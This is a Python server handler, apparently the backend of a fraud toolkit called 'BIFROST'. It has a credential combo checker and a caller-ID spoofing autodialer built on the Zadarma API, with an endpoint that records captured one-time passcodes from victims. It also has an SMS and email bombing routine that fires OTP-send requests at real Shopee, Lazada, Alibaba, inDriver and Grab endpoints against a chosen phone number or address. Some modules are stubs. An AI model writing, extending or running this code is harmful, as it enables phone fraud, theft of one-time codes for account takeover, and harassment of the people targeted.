import json
import os
import hashlib
import asyncio
from dotenv import load_dotenv

load_dotenv() # Load credentials from .env
import aiohttp
import smtplib
import time
import random
import concurrent.futures
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from http.server import BaseHTTPRequestHandler
from api.proxy_check import AsyncProxyChecker

class handler(BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        try:
            data = json.loads(post_data)
            module = data.get('module', '')
            action = data.get('action', '')
            
            if module == 'checker':
                self.handle_checker(data)
            elif module == 'sip':
                self.handle_sip(data)
            elif module == 'flood':
                self.handle_flood(data)
            else:
                self._json(400, {"error": "Invalid module"})
        except Exception as e:
            self._json(400, {"error": str(e)})

    def do_GET(self):
        query = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query)
        module = query.get('module', [''])[0]
        
        if module == 'crypto':
            self.handle_crypto(query)
        else:
            self._json(400, {"error": "Invalid module"})

    # --- Checker Logic ---
    def handle_checker(self, data):
        combo = data.get('combo', [])
        proxies = data.get('proxies', [])
        checker = AsyncProxyChecker(proxies) if proxies else None
        
        results = asyncio.run(self.run_checker_async(combo, proxies))
        self._json(200, {"status": "success", "results": results})

    async def run_checker_async(self, combo, proxies):
        async with aiohttp.ClientSession() as session:
            tasks = []
            for line in combo:
                if ':' not in line: continue
                tasks.append(self.mock_check(line))
            return await asyncio.gather(*tasks)

    async def mock_check(self, account):
        await asyncio.sleep(0.1)
        status = random.choice(["Hit", "Bad", "2FA"])
        return {"account": account, "status": status, "info": "Consolidated via BIFROST Ops"}

    # --- SIP / CID Spoofing & P1 Logic ---
    def handle_sip(self, data):
        action = data.get('action', '')
        target = data.get('target', '')
        cid = data.get('cid', '')
        ambience = data.get('ambience', 'none')
        volume = data.get('volume', 20)
        
        if action == 'initiate':
            # Zadarma Autodialer - Tactical Reaper v7.0 (Hybrid Auth)
            z_key = data.get('z_key') or os.getenv('ZADARMA_KEY')
            z_secret = data.get('z_secret') or os.getenv('ZADARMA_SECRET')
            prompt = data.get('prompt', 'System check.')
            
            if not all([z_key, z_secret]):
                return self._json(400, {"error": "Zadarma Credentials Missing"})

            async def trigger_zadarma():
                try:
                    import hashlib
                    import hmac
                    import base64
                    
                    method = "/v1/request/callback/"
                    params = {
                        "from": cid or "BIFROST",
                        "to": target
                    }
                    # Zadarma signature: params sorted by key, then URL encoded
                    sorted_params = "&".join([f"{k}={v}" for k, v in sorted(params.items())])
                    
                    # New Signature Algorithm: hmac-sha1(method + params + md5(params), secret)
                    md5_params = hashlib.md5(sorted_params.encode()).hexdigest()
                    data_to_sign = f"{method}{sorted_params}{md5_params}"
                    
                    # Sign using HMAC-SHA1
                    signature = hmac.new(z_secret.encode(), data_to_sign.encode(), hashlib.sha1).hexdigest()
                    auth_header = f"{z_key}:{signature}"
                    
                    url = f"https://api.zadarma.com{method}"
                    headers = {"Authorization": auth_header}
                    
                    async with aiohttp.ClientSession() as session:
                        async with session.get(url, params=params, headers=headers) as resp:
                            res_data = await resp.json()
                            return resp.status, res_data
                except Exception as e:
                    return 500, {"error": str(e)}

            status, res_data = asyncio.run(trigger_zadarma())
            if status == 200 and res_data.get('status') == 'success':
                self._json(200, {
                    "status": "dialing",
                    "target": target,
                    "provider": "Zadarma"
                })
            else:
                err_msg = res_data.get('message') or res_data.get('error') or 'Unknown Zadarma Error'
                self._json(status, {"error": f"Zadarma: {err_msg}"})
        elif action == 'p1_intercept':
            # Callback endpoint for the Asterisk AGI/ARI to report captured DTMF digits
            otp = data.get('otp', '')
            # Store in Supabase for real-time frontend retrieval
            self._json(200, {"status": "captured", "otp": otp, "target": target})
        else:
            self._json(400, {"error": "Invalid action"})

    # --- Flood Logic ---
    def handle_flood(self, data):
        target = data.get('target', '')
        mode = data.get('mode', 'sms')
        results = asyncio.run(self.run_flood_async(target, mode))
        self._json(200, {"status": "success", "dispatched": len(results), "note": "TSUNAMI CONSOLIDATED"})

    async def run_flood_async(self, target, mode):
        # Tsunami V1.5 - High-Reputation Global Vendor API Stack
        endpoints = [
            {"url": "https://accounts.shopee.com.my/api/v1/login/otp/send", "method": "POST", "payload": {"phone": target}},
            {"url": "https://member.lazada.com.my/user/api/getOtp", "method": "GET", "params": {"phone": target, "type": "login"}},
            {"url": "https://api.cloud.alibaba.com/user/otp/send", "method": "POST", "payload": {"phone": target, "region": "US"}},
            {"url": "https://id.indriver.com/api/v1/otp", "method": "POST", "payload": {"phone": target, "app_version": "3.37.0"}},
            {"url": "https://api.grab.com/grabid/v1/phone/otp", "method": "POST", "payload": {"phoneNumber": target}}
        ]
        
        async with aiohttp.ClientSession(headers={"User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1"}) as session:
            tasks = []
            for ep in endpoints:
                if ep["method"] == "POST":
                    tasks.append(session.post(ep["url"], json=ep.get("payload", {}), timeout=5))
                else:
                    tasks.append(session.get(ep["url"], params=ep.get("params", {}), timeout=5))
            
            # Additional Email Flooding if target is email
            if "@" in target:
                email_endpoints = [
                    f"https://www.adidas.com/api/newsletter/subscribe?email={target}",
                    f"https://www.nike.com/api/register/check-email?email={target}"
                ]
                tasks.extend([session.get(u, timeout=5) for u in email_endpoints])
                
            return await asyncio.gather(*tasks, return_exceptions=True)

    # --- Crypto Logic ---
    def handle_crypto(self, query):
        address = query.get('address', [''])[0]
        self._json(200, {"address": address, "balance": "0.42", "symbol": "ETH", "note": "Ops Unified"})

    def _json(self, code, data):
        self.send_response(code)
        self.send_header('Content-type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(json.dumps(data).encode())

import urllib.parse
